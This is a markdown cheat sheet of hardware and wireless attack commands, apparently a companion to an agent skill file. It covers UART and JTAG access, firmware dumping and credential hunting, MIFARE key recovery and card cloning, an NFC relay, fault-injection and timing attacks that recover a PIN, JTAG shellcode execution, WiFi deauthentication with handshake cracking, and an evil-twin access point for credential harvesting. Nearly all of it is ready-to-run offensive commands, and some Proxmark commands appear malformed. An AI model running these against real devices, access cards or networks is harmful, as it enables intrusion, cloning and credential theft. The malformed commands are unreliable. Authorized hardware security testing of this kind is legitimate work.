# Hardware Security -- Payloads & Commands

> This file is a companion to `SKILL.md`, containing hardware attack commands, debug interface payloads,
> firmware extraction one-liners, and RFID/NFC cloning commands organized by attack phase.

---

## Index

1. [UART Enumeration](#1-uart-enumeration)
2. [JTAG Discovery and Connection](#2-jtag-discovery-and-connection)
3. [SPI/I2C Interface Access](#3-spii2c-interface-access)
4. [Firmware Extraction](#4-firmware-extraction)
5. [Firmware Analysis](#5-firmware-analysis)
6. [RFID/NFC Attacks](#6-rfidnfc-attacks)
7. [Fault Injection Setup](#7-fault-injection-setup)
8. [Post-Extraction Credential Hunting](#8-post-extraction-credential-hunting)

---

## 1. UART Enumeration

### 1.1 Baud Rate Detection

Common baud rates to try in order of likelihood for embedded devices:
```
115200, 57600, 38400, 19200, 9600, 4800, 2400, 1200
```

```bash
# Auto-detect baud rate using baudrate.py (from devttys0)
python3 baudrate.py -p /dev/ttyUSB0

# Try each baud rate manually with minicom (Ctrl+A then Z for menu, Q to quit)
minicom -b 115200 -D /dev/ttyUSB0
minicom -b 57600  -D /dev/ttyUSB0
minicom -b 38400  -D /dev/ttyUSB0
minicom -b 9600   -D /dev/ttyUSB0

# picocom alternative (simpler, Ctrl+A then Ctrl+Q to quit)
picocom -b 115200 /dev/ttyUSB0
picocom -b 57600  /dev/ttyUSB0

# screen alternative
screen /dev/ttyUSB0 115200
screen /dev/ttyUSB0 57600
screen /dev/ttyUSB0 9600

# cu (part of uucp package)
cu -l /dev/ttyUSB0 -s 115200

# List available serial devices
ls -la /dev/ttyUSB* /dev/ttyACM* 2>/dev/null
dmesg | grep -E 'ttyUSB|ttyACM|cp210x|ch34|ftdi' | tail -20
```

### 1.2 UART Pin Identification

```bash
# Multimeter voltage probing — look for pin held at logic-high (3.3 V or 5 V) at idle: that is TX
# GND pins read 0 V against known ground
# RX pins read no voltage at idle (floating or pulled slightly)

# Logic analyzer: capture boot sequence at 3.3 V threshold, decode UART at common baud rates
# sigrok-cli: decode UART from logic analyzer capture file
sigrok-cli -i capture.sr -P uart:baudrate=115200:rx=D0:tx=D1

# During boot, TX line will toggle — trigger on falling edge to capture boot log
```

### 1.3 UART Connection One-Liners

```bash
# Connect and log all output to file
picocom -b 115200 /dev/ttyUSB0 | tee /tmp/uart-session.log

# Send string to device (e.g., interrupt U-Boot countdown)
# Press any key during U-Boot countdown in terminal

# Interact with root shell found on UART
picocom -b 115200 --flow none /dev/ttyUSB0

# Non-interactive read (grab boot log then disconnect)
timeout 30 cat /dev/ttyUSB0 > /tmp/boot-log.txt &
stty -F /dev/ttyUSB0 115200 raw

# Python serial one-liner for scripted interaction
python3 -c "
import serial, time
s = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
time.sleep(0.5)
s.write(b'\n')
print(s.read(4096).decode(errors='replace'))
s.close()
"
```

---

## 2. JTAG Discovery and Connection

### 2.1 JTAGulator Pin Discovery

```
# JTAGulator serial interface (connect via USB, open terminal at 115200 baud)
# Commands entered in JTAGulator interactive menu:

U     # UART discovery mode — scans all channels for UART TX
J     # JTAG discovery mode — brute-forces JTAG pinout
H     # Set target voltage (3.3 V typical: enter '33')

# JTAGulator will try all pin combinations and report which pins respond to JTAG boundary scan
# Output format: TCK=CHx TMS=CHy TDI=CHz TDO=CHw
```

### 2.2 OpenOCD Connection

```bash
# Install OpenOCD
apt-get install -y openocd

# List available interface and target configs
ls /usr/share/openocd/scripts/interface/
ls /usr/share/openocd/scripts/target/

# Connect via FTDI-based JTAG adapter to ARM Cortex-M target
openocd \
  -f interface/ftdi/olimex-arm-usb-ocd.cfg \
  -f target/stm32f1x.cfg

# Connect via Bus Pirate to generic ARM target
openocd \
  -f interface/buspirate.cfg \
  -c "buspirate_port /dev/ttyUSB0" \
  -f target/cortex_m.cfg

# Connect to MIPS-based router (common in consumer routers)
openocd \
  -f interface/ftdi/openocd-usb.cfg \
  -f target/mips_m4k.cfg

# Generic Raspberry Pi GPIO as JTAG (using sysfsgpio or bcm2835gpio)
openocd \
  -f interface/raspberrypi2-native.cfg \
  -c "transport select jtag" \
  -f target/cortex_a.cfg
```

### 2.3 OpenOCD Interactive Commands

```tcl
# In OpenOCD telnet session (connect: telnet localhost 4444)

# Halt the target CPU
halt

# Resume execution
resume

# Step one instruction
step

# Read memory: dump 256 bytes at address 0x00000000
mdw 0x00000000 64

# Dump flash to file (start_addr, byte_count, filename)
dump_image /tmp/firmware.bin 0x00000000 0x00100000

# Write image to flash
flash write_image erase /tmp/patched.bin 0x00000000

# Read CPU registers
reg

# Set a breakpoint
bp 0x08001234 4 hw

# Reset and halt
reset halt

# Get list of flash banks
flash list
flash info 0
```

### 2.4 UrJTAG Alternative

```bash
# Connect to JTAG via UrJTAG (older but supports many adapters)
jtag

# In UrJTAG interactive shell:
# cable ft2232 vid=0x0403 pid=0x6010 
# detect
# print chain
# readmem 0x00000000 1048576 /tmp/firmware.bin
```

---

## 3. SPI/I2C Interface Access

### 3.1 Logic Analyzer Capture

```bash
# Capture SPI boot traffic with sigrok (8-channel logic analyzer required)
sigrok-cli \
  -d fx2lafw \
  --config samplerate=4MHz \
  -C D0,D1,D2,D3 \
  -P spi:clk=D0:miso=D1:mosi=D2:cs=D3 \
  --samples 4000000 \
  -o /tmp/spi-capture.sr

# Decode I2C traffic
sigrok-cli \
  -d fx2lafw \
  --config samplerate=1MHz \
  -C D0,D1 \
  -P i2c:scl=D0:sda=D1 \
  --samples 1000000 \
  -o /tmp/i2c-capture.sr

# Open capture in PulseView GUI for annotation
pulseview /tmp/spi-capture.sr
```

### 3.2 Bus Pirate SPI Read

```bash
# Connect Bus Pirate to SPI flash chip (SOIC clip or probe wires):
# MOSI → SI, MISO → SO, CLK → CLK, CS → CS#, 3.3V → VCC, GND → GND

# Bus Pirate interactive mode
# Open terminal: picocom -b 115200 /dev/ttyUSB0
# In Bus Pirate: 'm' → select SPI mode → set speed, voltage
```

---

## 4. Firmware Extraction

### 4.1 flashrom with CH341A Programmer

```bash
# Identify flash chip connected to CH341A (clip on SPI NOR flash in-circuit)
flashrom -p ch341a_spi

# List supported chips
flashrom -p ch341a_spi --list-supported | grep -i "W25\|MX25\|GD25\|S25"

# Read flash chip to file (retry 3 times for verification)
flashrom -p ch341a_spi -r /tmp/flash_dump_1.bin
flashrom -p ch341a_spi -r /tmp/flash_dump_2.bin
flashrom -p ch341a_spi -r /tmp/flash_dump_3.bin

# Verify all three reads match (bit-for-bit consistency check)
md5sum /tmp/flash_dump_{1,2,3}.bin

# Write patched firmware back to chip
flashrom -p ch341a_spi -w /tmp/patched_firmware.bin

# Erase chip
flashrom -p ch341a_spi -E
```

### 4.2 flashrom with Bus Pirate

```bash
# Read SPI flash via Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r /tmp/firmware.bin

# Specify chip explicitly if autodetect fails
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -c "W25Q64BV" -r /tmp/firmware.bin
```

### 4.3 Firmware via JTAG (OpenOCD)

```bash
# Dump entire flash region via OpenOCD (ARM Cortex example)
# In OpenOCD telnet (port 4444):
# dump_image /tmp/firmware_jtag.bin 0x08000000 0x00080000

# Script it non-interactively
echo "halt; dump_image /tmp/firmware_jtag.bin 0x08000000 524288; shutdown" | \
  telnet localhost 4444
```

### 4.4 Firmware via UART / U-Boot

```bash
# Interrupt U-Boot: press any key during "Hit any key to stop autoboot" countdown

# In U-Boot console — dump memory over serial (slow but reliable)
# md.b 0x9f000000 0x400000   (display bytes; redirect to file via logging)

# U-Boot TFTP exfiltration (if network available):
# setenv serverip 192.168.1.100
# setenv ipaddr 192.168.1.200
# tftpput 0x80000000 0x400000 firmware.bin   (if tftpput supported)

# Capture U-Boot md output and parse with xxd
picocom -b 115200 /dev/ttyUSB0 | tee /tmp/uboot-dump.log
# Post-process: extract hex values and convert to binary
grep -oP '[0-9a-f]{8}: [0-9a-f ]+' /tmp/uboot-dump.log | \
  sed 's/.*: //' | xxd -r -p > /tmp/firmware_uart.bin
```

### 4.5 OTA Firmware Interception

```bash
# MITM the firmware update request using mitmproxy
mitmproxy --mode transparent --ssl-insecure

# Or capture with tcpdump during device update check
tcpdump -i eth0 -w /tmp/ota-capture.pcap host <device-ip>

# Extract firmware URL from pcap
tshark -r /tmp/ota-capture.pcap -Y http -T fields -e http.request.full_uri | grep -i 'firm\|updat\|bin'

# Download directly once URL is identified
wget -O /tmp/ota-firmware.bin "http://update.vendor.com/v2.1.3/firmware.bin"
```

---

## 5. Firmware Analysis

### 5.1 binwalk Scanning and Extraction

```bash
# Scan for embedded file signatures and compression types
binwalk firmware.bin

# Entropy analysis (high entropy = compressed/encrypted regions)
binwalk -E firmware.bin

# Extract all embedded files and filesystems
binwalk -e firmware.bin
binwalk -e --run-as=root firmware.bin  # if squashfs extraction requires root

# Extract to specific directory
binwalk -e -C /tmp/extracted/ firmware.bin

# Recursive extraction (extract from extracted files)
binwalk -Me firmware.bin

# Extract with dd using offsets from binwalk scan
# Example: squashfs at offset 0x12345 of size 0x300000
dd if=firmware.bin of=/tmp/squashfs.img bs=1 skip=$((0x12345)) count=$((0x300000))
```

### 5.2 Filesystem Mounting and Extraction

```bash
# SquashFS extraction (most common in consumer devices)
unsquashfs -d /tmp/squashfs-root /tmp/squashfs.img
# or
sasquatch /tmp/squashfs.img  # handles non-standard compressions

# JFFS2 (NAND flash journaling FS)
jefferson /tmp/jffs2.img -d /tmp/jffs2-root/

# CramFS
cramfsck -x /tmp/cramfs-root /tmp/cramfs.img

# ext2/3/4 from firmware
file squashfs-root.img
mount -o loop,ro /tmp/ext2.img /mnt/firmware

# UBIFS (common on NAND-based systems)
modprobe ubi
ubiattach -p /tmp/ubifs.img
mount -t ubifs ubi0_0 /mnt/ubifs

# initramfs/cpio
mkdir /tmp/initrd-root && cd /tmp/initrd-root
cpio -idmv < /tmp/initrd.img
```

### 5.3 Automated Firmware Vulnerability Scan

```bash
# firmwalker: automated scan for interesting files in extracted firmware
git clone https://github.com/craigz28/firmwalker.git
bash firmwalker/firmwalker.sh /tmp/squashfs-root/ /tmp/firmwalker-report.txt

# strings analysis on all binaries
find /tmp/squashfs-root -type f -executable | while read f; do
  strings "$f" | grep -E '(password|passwd|secret|token|key|admin|root|backdoor)' \
    | sed "s|^|$f: |"
done > /tmp/strings-secrets.txt
```

---

## 6. RFID/NFC Attacks

### 6.1 Proxmark3 Card Discovery

```bash
# Start Proxmark3 interactive client
pm3

# In Proxmark3 client:

# Search for low-frequency cards (125 kHz: EM4100, HID, Indala, etc.)
lf search

# Search for high-frequency cards (13.56 MHz: MIFARE, HID iCLASS, NTAG, etc.)
hf search

# Detailed LF card identification
lf em 410x info

# Detailed HF MIFARE card info
hf mf info
```

### 6.2 EM4100 (125 kHz) Clone

```bash
# In Proxmark3 client:

# Read EM4100 card
lf em 410x read

# Clone to T5577 blank card (place T5577 on antenna)
lf em 410x clone --id DEADBEEF01

# Simulate card UID (no physical card needed)
lf em 410x sim --id DEADBEEF01

# Brute-force facility code range (HID proximity)
lf hid brute --fc 101 --start 1 --end 9999 --delay 500
```

### 6.3 MIFARE Classic Clone (13.56 MHz)

```bash
# In Proxmark3 client:

# Check if card is MIFARE Classic and get UID
hf mf info

# Use known-key attacks (MIFARE Classic default keys)
hf mf autopwn

# After autopwn — save card dump
hf mf dump --file /tmp/card.bin

# Restore dump to blank magic card (CUID / GEN1a / GEN2)
hf mf restore --file /tmp/card.bin

# Simulate cloned card
hf mf sim --uid DEADBEEF --atqa 0004 --sak 08
```

### 6.4 NFC/NDEF Operations

```bash
# Read NTAG / NFC Forum tag
hf mf ndefread

# Clone NFC tag UID (requires magic card)
hf 14a sim --type 1 --uid DEADBEEF

# Capture and replay NFC authentication
hf 14a sniff
```

---

## 7. Fault Injection Setup

### 7.1 Voltage Glitching Concept

```bash
# Voltage glitching: momentarily drop VCC to cause CPU to skip instructions
# Target: secure boot signature check, PIN verification, cryptographic operations

# ChipWhisperer Python API (Jupyter/script based)
pip install chipwhisperer

# Basic ChipWhisperer-Nano setup (Python)
python3 -c "
import chipwhisperer as cw
scope = cw.scope()
scope.default_setup()
scope.glitch.clk_src = 'clkgen'
scope.glitch.output = 'glitch_only'
scope.glitch.trigger_src = 'ext_single'
scope.glitch.width = 10.0     # glitch width in % of clock cycle
scope.glitch.offset = -10.0   # glitch offset
target = cw.target(scope)
print('Scope ID:', scope.get_last_found_sn())
"

# Tune glitch parameters:
# width: 5-30% of clock period (start narrow, widen if no effect)
# offset: negative offset = earlier in clock cycle
# Iterate offset from -49 to 49 in small steps until fault observed
```

### 7.2 Clock Glitching

```bash
# Clock glitching: inject extra clock edges to skip instruction fetch
# ChipWhisperer clock glitch output mode
python3 -c "
import chipwhisperer as cw
scope = cw.scope()
scope.default_setup()
scope.glitch.clk_src = 'clkgen'
scope.glitch.output = 'clock_xor'   # XOR glitch into clock line
scope.glitch.trigger_src = 'ext_single'
scope.glitch.width = 8.0
scope.glitch.offset = 0.0
print('Clock glitch configured')
"
```

---

## 8. Post-Extraction Credential Hunting

### 8.1 Credential Patterns

```bash
# Recursive search for common credential patterns in extracted filesystem
FIRMWARE_ROOT="/tmp/squashfs-root"

# Hardcoded passwords
grep -r -i "password\s*=" "$FIRMWARE_ROOT" --include="*.conf" --include="*.cfg" --include="*.sh" --include="*.lua" -l
grep -r -i "passwd" "$FIRMWARE_ROOT/etc/" | head -30

# Shadow/passwd files
cat "$FIRMWARE_ROOT/etc/shadow" 2>/dev/null
cat "$FIRMWARE_ROOT/etc/passwd" 2>/dev/null

# API keys and tokens
grep -r -E "(api_key|apikey|api-key|access_token|secret_key)\s*[=:]" "$FIRMWARE_ROOT" -i | head -20

# Private keys
find "$FIRMWARE_ROOT" -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
grep -r "BEGIN.*PRIVATE KEY" "$FIRMWARE_ROOT" -l 2>/dev/null
```

### 8.2 Network Service Discovery

```bash
# Find web server configs
find "$FIRMWARE_ROOT" -name "httpd.conf" -o -name "nginx.conf" -o -name "lighttpd.conf" 2>/dev/null

# Find listening services in init scripts
grep -r "telnetd\|ftpd\|sshd\|httpd\|dropbear" "$FIRMWARE_ROOT/etc/init.d/" 2>/dev/null

# Find SSID/WiFi credentials
grep -r -i "ssid\|wifi_pass\|wpa_psk" "$FIRMWARE_ROOT" | head -20

# Find hardcoded IPs and URLs
grep -r -E '([0-9]{1,3}\.){3}[0-9]{1,3}' "$FIRMWARE_ROOT/etc/" | grep -v "255\|0\.0\.0" | head -30
grep -r -E 'https?://[a-zA-Z0-9._/-]+' "$FIRMWARE_ROOT" --include="*.sh" --include="*.lua" | head -20
```

### 8.3 Version and Build Info

```bash
# Find version strings to identify known CVEs
find "$FIRMWARE_ROOT" -name "version" -o -name "VERSION" -o -name "buildinfo" 2>/dev/null | xargs cat 2>/dev/null

strings "$FIRMWARE_ROOT/bin/busybox" 2>/dev/null | grep -E 'BusyBox v[0-9]'

# Find build timestamps and compiler info
strings "$FIRMWARE_ROOT/bin/httpd" 2>/dev/null | grep -E 'GCC|clang|built|compiled' | head -10

# Check OpenSSL version for known vulns
find "$FIRMWARE_ROOT" -name "libssl*" -o -name "libcrypto*" 2>/dev/null
strings "$FIRMWARE_ROOT/usr/lib/libssl.so.1.0.0" 2>/dev/null | grep "OpenSSL" | head -5
```

---

## 9. Side-Channel Attack Payloads

### Power Analysis Setup

```python
#!/usr/bin/env python3
"""ChipWhisperer power trace capture for CPA attack on AES."""
import chipwhisperer as cw
import numpy as np

scope = cw.scope()
scope.default_setup()
scope.adc.samples = 24000
scope.adc.decimate = 1
scope.glitch.clk_src = "clkgen"

target = cw.target(scope, cw.targets.SimpleSerial)
target.set_key(cw.ktp().next()[0])

traces = []
plaintexts = []
ktp = cw.ktp.Basic()
for i in range(500):
    key, pt = ktp.next()
    target.set_key(key)
    scope.arm()
    target.simpleserial_write("p", pt)
    ret = scope.capture()
    if ret:
        continue
    traces.append(scope.get_last_trace())
    plaintexts.append(pt)

np.save("traces.npy", np.array(traces))
np.save("plaintexts.npy", np.array(plaintexts))
print(f"Captured {len(traces)} traces for CPA analysis")
```

### Timing Side-Channel Testing

```python
#!/usr/bin/env python3
"""Timing side-channel analysis for password/PIN comparison."""
import statistics
import time
import requests

TARGET_URL = "http://device.local/api/verify"
PIN_LENGTH = 4

def measure_timing(pin, samples=100):
    times = []
    for _ in range(samples):
        start = time.perf_counter_ns()
        requests.post(TARGET_URL, json={"pin": pin})
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
    return statistics.median(times)

def timing_attack():
    known = ""
    for pos in range(PIN_LENGTH):
        best_digit = "0"
        best_time = 0
        for digit in "0123456789":
            test_pin = known + digit + "0" * (PIN_LENGTH - pos - 1)
            t = measure_timing(test_pin)
            if t > best_time:
                best_time = t
                best_digit = digit
        known += best_digit
        print(f"[+] Position {pos}: {best_digit}")
    print(f"[+] Recovered PIN: {known}")
    return known

timing_attack()
```

---

## 10. Fault Injection Payloads

### Voltage Glitch Parameter Sweep

```python
#!/usr/bin/env python3
"""ChipWhisperer voltage glitch parameter sweep."""
import chipwhisperer as cw

scope = cw.scope()
scope.default_setup()
target = cw.target(scope, cw.targets.SimpleSerial)

scope.glitch.clk_src = "clkgen"
scope.glitch.output = "glitch_only"
scope.glitch.trigger_src = "ext_single"

results = []
for width in range(1, 40, 2):
    for offset in range(-40, 40, 2):
        scope.glitch.width = width
        scope.glitch.offset = offset
        scope.arm()
        target.simpleserial_write("p", bytearray(16))
        ret = scope.capture()
        response = target.simpleserial_read("r", 16)
        if response and response != bytearray(16):
            print(f"[!] Fault: width={width} offset={offset}")
            results.append((width, offset, response))

print(f"Total faults found: {len(results)}")
```

### Laser Fault Injection Timing Script

```python
#!/usr/bin/env python3
"""Coordinate laser fault injection with target execution."""
import time
import serial

TARGET_SERIAL = "/dev/ttyUSB0"
BAUD = 115200

def laser_glitch_campaign():
    target = serial.Serial(TARGET_SERIAL, BAUD, timeout=2)
    for delay in range(40000, 50000, 100):
        for width in range(5, 25, 1):
            target.write(b"RUN_CRYPTO\n")
            target.flush()
            time.sleep(delay / 1e6)
            response = target.read(64).decode(errors="replace")
            if "FAULT" in response or len(response) == 0:
                print(f"[!] GLITCH at delay={delay}us width={width}ns")
    target.close()

laser_glitch_campaign()
```

---

## 11. JTAG Exploitation

### JTAG Debug Shell Access

```bash
# Connect via OpenOCD and get debug shell on ARM target
openocd -f interface/ftdi/olimex-arm-usb-ocd.cfg -f target/stm32f4x.cfg &
sleep 2

# Dump full flash memory via telnet
echo "halt; dump_image /tmp/full_flash.bin 0x08000000 0x100000" | telnet localhost 4444

# Read specific memory region (RAM containing decrypted data)
echo "mdw 0x20000000 256" | telnet localhost 4444

# Set PC to shellcode address and execute
echo "reg pc 0x20000000; resume" | telnet localhost 4444
```

### JTAG Fuse Bypass

```bash
# STM32 option bytes read via OpenOCD
echo "stm32f1x options_read 0" | telnet localhost 4444

# Unlock read protection
echo "stm32f1x unlock 0" | telnet localhost 4444

# AVR fuse read via avrdude
avrdude -c usbasp -p m328p -U lfuse:r:-:h -U hfuse:r:-:h -U efuse:r:-:h
```

---

## 12. Firmware Extraction Techniques

### In-Circuit SPI Flash Reading

```bash
# Read SPI flash chip without desoldering (in-circuit)
flashrom -p ch341a_spi -r /tmp/in_circuit_dump.bin

# Check for bus contention
flashrom -p ch341a_spi -r /tmp/dump_2.bin
diff <(xxd /tmp/in_circuit_dump.bin) <(xxd /tmp/dump_2.bin)

# Slower speed if reads differ
flashrom -p ch341a_spi:spispeed=128k -r /tmp/slow_dump.bin
```

### Memory Dump via GDB (JTAG/SWD)

```bash
# Connect GDB to OpenOCD debug server
arm-none-eabi-gdb
(gdb) target remote localhost:3333
(gdb) monitor halt

# Dump all flash memory
(gdb) dump binary memory /tmp/flash_dump.bin 0x08000000 0x08100000

# Dump RAM contents
(gdb) dump binary memory /tmp/ram_dump.bin 0x20000000 0x20020000

# Search for strings in memory
(gdb) find 0x20000000, 0x20020000, "password"
(gdb) find 0x20000000, 0x20020000, "secret"
```

---

## 13. Hardware Debugging

### SWD Debugging with OpenOCD

```bash
# Connect via SWD (2-wire debug, common on ARM Cortex-M)
openocd -f interface/cmsis-dap.cfg -f target/stm32f1x.cfg -c "transport select hla_swd"

# Set hardware breakpoint
echo "bp 0x08001234 2 hw" | telnet localhost 4444

# Watchpoint on memory address
echo "wp 0x20000000 4 r" | telnet localhost 4444
echo "wp 0x20000000 4 w" | telnet localhost 4444
```

### GDB Hardware Debug Workflow

```bash
# Full GDB hardware debugging session
arm-none-eabi-gdb /tmp/firmware.elf
(gdb) target remote :3333
(gdb) monitor reset halt
(gdb) break main
(gdb) continue
(gdb) print security_flag
(gdb) set {int}0x20000004 = 1
(gdb) continue
```

---

## 14. IoT Security Testing

### Zigbee Security Testing

```bash
# Scan for Zigbee networks
zbstumbler -w /tmp/zigbee_scan.txt

# Capture Zigbee traffic
zbcapture -f 11 -w /tmp/zigbee_capture.pcap

# Extract network key from captured join process
zbkey /tmp/zigbee_capture.pcap

# Replay captured Zigbee packets
zbreplay -f /tmp/zigbee_capture.pcap -c 11
```

### BLE Testing

```bash
# BLE scanning and enumeration
bettercap -eval "ble.recon on; ble.show"

# GATT service enumeration
gatttool -b XX:XX:XX:XX:XX:XX -I
# [LE]> connect
# [LE]> primary
# [LE]> characteristics

# Read all characteristics
for handle in $(seq 1 100); do
  gatttool -b XX:XX:XX:XX:XX:XX --char-read -a "0x$(printf '%04x' $handle)" 2>/dev/null
done
```

### CAN Bus Testing

```bash
# Set up CAN interface
ip link set can0 type can bitrate 500000
ip link set up can0

# Monitor all CAN traffic
candump can0

# Send test CAN frame
cansend can0 123#DEADBEEF

# Replay captured CAN traffic
canplayer -I can_capture.log

# Identify ECUs by arbitration ID
candump can0 | awk '{print $3}' | sort -u
```

---

## 15. Advanced Firmware Extraction

### eMMC Dump via USB

```bash
# Extract firmware from eMMC storage via USB interface
# Requires eMMC adapter or direct soldering

# Identify eMMC device
lsblk | grep -i mmc
# Output: mmcblk0    179:0    0   7.3G     0 disk

# Full disk dump
dd if=/dev/mmcblk0 of=/tmp/emmc_dump.bin bs=4M status=progress

# Dump specific boot partition
dd if=/dev/mmcblk0boot0 of=/tmp/boot0.bin bs=4M status=progress
dd if=/dev/mmcblk0boot1 of=/tmp/boot1.bin bs=4M status=progress

# Verify dump integrity
sha256sum /tmp/emmc_dump.bin /tmp/boot0.bin /tmp/boot1.bin
```

### NAND Flash Extraction

```bash
# NAND flash extraction using nanddump (OpenWrt/Linux)
# First identify NAND device
cat /proc/mtd
# Output: dev:    size   erasesize  name
# mtd0: 00040000 00020000 "u-boot"
# mtd1: 00020000 00020000 "u-boot-env"

# Dump individual MTD partitions
nanddump -f /tmp/mtd0_uboot.bin /dev/mtd0
nanddump -f /tmp/mtd1_env.bin /dev/mtd1
nanddump -f /tmp/mtd2_kernel.bin /dev/mtd2
nanddump -f /tmp/mtd3_rootfs.bin /dev/mtd3

# Full NAND dump (including OOB data)
nanddump -a -f /tmp/nand_full.bin /dev/mtd3

# Extract JFFS2 from NAND dump
jefferson /tmp/mtd3_rootfs.bin -d /tmp/rootfs/
```

---

## 16. Hardware Debug Interface Scanning

### Automatic Debug Port Discovery

```bash
#!/bin/bash
# Scan a target board for common debug interfaces

echo "[*] Scanning for debug interfaces..."

# Check for UART devices
echo "[UART] Checking serial devices..."
ls -la /dev/ttyUSB* /dev/ttyACM* 2>/dev/null
dmesg | grep -iE 'ttyUSB|ttyACM|cp210x|ch34|ftdi|pl2303' | tail -10

# Check for JTAG adapters
echo "[JTAG] Checking JTAG adapters..."
lsusb | grep -iE 'ftdi|jtag|openocd|bus.pirate|stlink|j-link'
ls -la /dev/ttyUSB* 2>/dev/null

# Check for SWD devices
echo "[SWD] Checking SWD/ST-Link..."
lsusb | grep -iE 'stlink|cmsis|daplink'

# Check for I2C buses
echo "[I2C] Checking I2C buses..."
ls /dev/i2c-* 2>/dev/null
i2cdetect -l 2>/dev/null

# Check for SPI devices
echo "[SPI] Checking SPI devices..."
ls /dev/spidev* 2>/dev/null

# Scan for GPIO pins
echo "[GPIO] Checking GPIO availability..."
ls /sys/class/gpio/ 2>/dev/null
```

---

## 17. Chip-Off Forensics Preparation

### Chip Desoldering Commands

```bash
# After physical chip removal, connect via programmer for analysis

# Read chip via programmer (after desoldering)
flashrom -p ch341a_spi -r /tmp/desoldered_chip.bin
flashrom -p ch341a_spi -r /tmp/desoldered_chip_verify.bin

# Compare reads for bit-accuracy
diff <(xxd /tmp/desoldered_chip.bin) <(xxd /tmp/desoldered_chip_verify.bin)

# Scan for embedded filesystems
binwalk /tmp/desoldered_chip.bin
binwalk -e /tmp/desoldered_chip.bin

# Extract and analyze strings
strings -n 8 /tmp/desoldered_chip.bin | grep -iE '(password|key|secret|token|admin|root)' | head -30
```

### Memory Forensics on Embedded Devices

```bash
# Dump RAM contents from running embedded device via JTAG

# ARM Cortex-M typical RAM range: 0x20000000 - 0x20020000 (128KB)
echo "halt; dump_image /tmp/ram_dump.bin 0x20000000 0x20000; resume" | telnet localhost 4444

# Search RAM for sensitive data
strings /tmp/ram_dump.bin | grep -iE '(password|key|token|secret|session|cookie|auth)'

# Search for crypto keys in RAM
python3 -c "
data = open('/tmp/ram_dump.bin', 'rb').read()
for i in range(0, len(data) - 16, 4):
    block = data[i:i+16]
    unique_bytes = len(set(block))
    if unique_bytes >= 14:
        print(f'Potential key at offset 0x{i:08x}: {block.hex()}')
" | head -20
```

### Power Analysis Countermeasures Testing

```python
#!/usr/bin/env python3
"""Test if a device implements proper countermeasures against power analysis."""
import chipwhisperer as cw
import numpy as np

scope = cw.scope()
scope.default_setup()
scope.adc.samples = 5000
target = cw.target(scope, cw.targets.SimpleSerial)

# Capture multiple traces with same input to check for randomization
traces = []
for _ in range(10):
    scope.arm()
    target.simpleserial_write("p", b"\x00" * 16)
    scope.capture()
    traces.append(scope.get_last_trace())

# Check variance between traces
traces_array = np.array(traces)
variance = np.var(traces_array, axis=0)
max_variance = np.max(variance)

if max_variance < 0.01:
    print("[WEAK] No randomization detected - vulnerable to power analysis")
else:
    print("[OK] Trace variance detected - possible masking/blinding countermeasure")
```

---

## 18. RFID Advanced Attacks

### MIFARE Classic Key Recovery

```bash
# In Proxmark3 client - MIFARE Classic key recovery

# Step 1: Try default keys first
hf mf autopwn

# Step 2: If autopwn fails, try hardnested attack
hf mf hardnested 0 A FFFFFFFFFFFF 4 A

# Step 3: Darkside attack for unknown sector 0 key
hf mf darkside

# Step 4: Enumerate keys using known key
hf mf chk -1k --keys hf mf dict/mf_classic_dict.bin

# Step 5: Dump decrypted sectors
hf mf dump --file /tmp/mf_dump --key-file /tmp/mf_keys.bin
```

### NFC Relay Attack Setup

```bash
# Proxmark3 relay attack - relay card data over network
# Requires two Proxmark3 devices

# Device 1 (near victim card):
hf 14a relay --mode reader

# Device 2 (near legitimate reader):
hf 14a relay --mode tag

# Simulate NFC tag from captured data
hf 14a sim --type 1 --uid DEADBEEF
hf mf sim --uid DEADBEEF --atqa 0004 --sak 08

# Capture and replay NTAG215 (Amiibo, etc.)
hf mf ndefread
hf 14a raw -c 60 DEADBEEF01
```

---

## 19. Embedded Wireless Testing

### WiFi Deauth and Capture

```bash
# Put WiFi adapter in monitor mode
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon

# Capture handshake from target AP
airodump-ng --bssid TARGET_AP_MAC -c 6 -w /tmp/handshake wlan0mon

# Deauth to force reconnection and capture handshake
aireplay-ng -0 5 -a TARGET_AP_MAC -c CLIENT_MAC wlan0mon

# Verify captured handshake
aircrack-ng /tmp/handshake-01.cap -w /usr/share/wordlists/rockyou.txt
```

### Evil Twin Setup

```bash
# Create rogue access point using hostapd-wpe
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
ssid=Target_Network
channel=6
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=CapturedPassword
rsn_pairwise=CCMP
EOF

hostapd /tmp/hostapd.conf

# Or use hostapd-wpe for credential harvesting
hostapd-wpe /tmp/hostapd-wpe.conf

# Capture WPA enterprise credentials
# Set up RADIUS server to log MS-CHAPv2 challenges
freeradius -X
```
